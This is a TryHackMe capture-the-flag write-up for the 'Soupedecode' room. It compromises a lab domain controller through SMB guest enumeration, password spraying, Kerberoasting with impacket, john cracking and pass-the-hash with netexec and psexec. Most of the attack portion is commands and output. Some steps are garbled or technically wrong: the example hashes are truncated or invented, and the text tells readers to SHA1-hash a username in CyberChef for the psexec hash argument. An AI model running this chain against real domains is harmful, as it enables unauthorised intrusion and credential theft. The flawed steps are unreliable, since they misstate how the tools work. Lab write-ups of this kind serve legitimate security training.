# SoupeDecode Challenge on TryHackMe

You can find it inside the TryHackMe easy difficulty room.

## Challenge Description

> Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.

This is kinda of a challenge about domain controllers and kerberos authentication, SMB shares and everythings.

## Nmap Scan

First, we gonna do a nmap scan to see what ports are open on the target machine.  
By the way, all the tools you gonna use here are already pre-installed inside a Kali Linux machine or Parrot OS.

```bash
nmap -sC -sV -p- -T4 --min-rate=1000 -oN nmap/allports.txt
```

- `-sC` for default script
- `-sV` for version detection
- `-p-` for all ports
- `-T4` for faster scan
- `--min-rate=1000` for minimum rate of 1000 packets per second
- `-oN` for output in normal format

We got the response from nmap:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-04 11:44:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:  
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-04T11:45:40+00:00
|_ssl-date: 2026-02-04T11:46:19+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2026-02-03T11:25:31
|_Not valid after:  2026-08-05T11:25:31
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49713/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```




Okay, so here we have a bunch of open ports. The first thing I'm gonna do is try to enumerate the SMB and see if the guest account is enabled or not, because if the guest account is enabled, we can use it to access the SMB shares and maybe find some useful information there.

**There is one way with Metasploit using the lookupsid module where we give the RHOSTS the guest SMB user and let it treat it. You just navigate in Metasploit and see it.**

**And another way using NetExec where we can use the smbclient to connect to the SMB shares and see if we can access them with the guest account.**

```bash
nxc smb \\<IP_ADDRESS> -u "guest" -p "" --shares
```

Output:

```
SMB         10.67.184.231   445    DC01             [*] Windows Server 2022 Build 48 x64 (name:DC01)
(domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.67.184.231   445    DC01             [+] SOUPEDECODE.LOCAL\guest:  
SMB         10.67.184.231   445    DC01             [*] Enumerated shares
SMB         10.67.184.231   445    DC01             Share           Permissions     Remark
SMB         10.67.184.231   445    DC01             -----           -----------     ------
SMB         10.67.184.231   445    DC01             ADMIN$                          Remote Admin
SMB         10.67.184.231   445    DC01             backup                           
SMB         10.67.184.231   445    DC01             C$                              Default share
SMB         10.67.184.231   445    DC01             IPC$            READ            Remote IPC
SMB         10.67.184.231   445    DC01             NETLOGON                        Logon server share
SMB         10.67.184.231   445    DC01             SYSVOL                          Logon server share
SMB         10.67.184.231   445    DC01             Users
```

Because the guest account is enabled, we can access the SMB shares and we can see that there are some interesting shares like backup and Users, and maybe we can find some useful information there.  
// There is backup which may be useful later.

I only have read access to the IPC$ share and nothing else, so Metasploit is kinda the better way to do it. So I take the lookupsid module and I give it the RHOSTS the guest SMB user and let it treat it and see if we can find some useful information there.

It returned 1069 accounts.

So now we have a list of users that we can use to perform a password spraying attack to find valid credentials.

I used a Python script to only get the username from the input from Metasploit.

Then with only the username:

## So the objectif is to try out all the username with a password same as the username to see if we can find any valid credentials.

```bash
netexec smb \\<IP_ADDRESS> -u user.txt -p user1.txt --no-bruteforce | grep -v FAILURE
```

We got one that match: user = [USERNAME] password = [USERNAME] in SOUPEDECODE.LOCAL domain.  
Using these credentials, we can try to access the SMB shares again to see if we can find any useful information there.

```bash
smbclient -L \\<IP_ADDRESS> -U 'SOUPEDECODE.LOCAL\[USERNAME]'
```

When prompted for the password, we give [USERNAME].

No shares really interesting, we have a share "Users" in there. We gonna try accessing it.

```bash
smbclient \\<IP_ADDRESS>\Users -U 'SOUPEDECODE.LOCAL\[USERNAME]'
```

When prompted for the password, we give [USERNAME].

We get inside and see the users we found. Going inside his folder, we can find the user.txt inside /desktop.

Inside a share, use command: `more user.txt` to print it, and `:q` to quit the mode.



## The Next Step

Using impacket-GetUserSPNS.py to enumerate the SPN to find any service account that we can use to perform pass the hash attack.

```bash
impacket-GetUserSPNS SOUPEDECODE.LOCAL/[USERNAME]:[USERNAME] -dc-ip <IP_ADDRESS> -request
```

We get a lot of hashes for a lot of services:

- ftp/fileserver
- fw/proxyserver
- http/backupServer
- http/Webserver
- https/monitoringserver

Putting all the files inside a text I named hash.txt.

Like this as an example:  
fileserver:SOUPDECODE.LOCAL$@aad3b435b51404eeaad3b435b51404ee:bbf7e5f4c2d6c6f4e8f4e8f4e8f4e8f4  
proxyserver:SOUPDECODE.LOCAL$@aad3b435b514

We use John to do some decryption.

```bash
john hash.txt -w=/usr/share/wordlists/rockyou.txt
```

And we get one password for the file_svc.

We then reconnect to SMB.

```bash
smbclient -L \\<IP_ADDRESS> -U 'SOUPEDECODE.LOCAL\file_svc'
```

When prompted for the password, and we see the share backup that we said earlier we have read access to it.

We reconnect using smbclient.

```bash
smbclient \\<IP_ADDRESS>\backup -U 'SOUPEDECODE.LOCAL\file_svc'
```

And we do a get command.

```bash
get backup.extract.txt
```

We get a username:uid:hash type file, so we have to get everything alone the hash and the users.

Using this command:

```bash
cat backup.extract.txt | cut -d ':' -f 1 > backup.users.txt
```

And

```bash
cat backup.extract.txt | cut -d ':' -f 4 | awk '{print "00000000000000000000000000000000:"$1}' > backup.hashes.txt  // some Windows stuff
```

We do the same with NetExec to try to see if a username uses the same as password hashes. This is the pass the hash method.

```bash
netexec smb \\<IP_ADDRESS> -u backup.user.txt -H backup.hashes.txt
```

-H = to pass a hash

And we got a match, the FileServer matches one of the hashes.

So we got a hash and a username. Right now, to use impacket-psexec, we have to transform the username to hash. Go to CyberChef and transform the username to hash using SHA1.

Example:  
username = SOUPEDECODE.LOCAL\FileServer$  
password = some hash

Send the username to CyberChef and try the impacket command here.

```bash
impacket-psexec 'FileServer$@<IP_ADDRESS>' -hashes 'hash_of_the_username:password_hash_that_match'
```

And we get inside, seeing a little Windows terminal. We navigate through ../../Users/Administrators/Desktop and we got the root.txt.

Congrat!!!!!
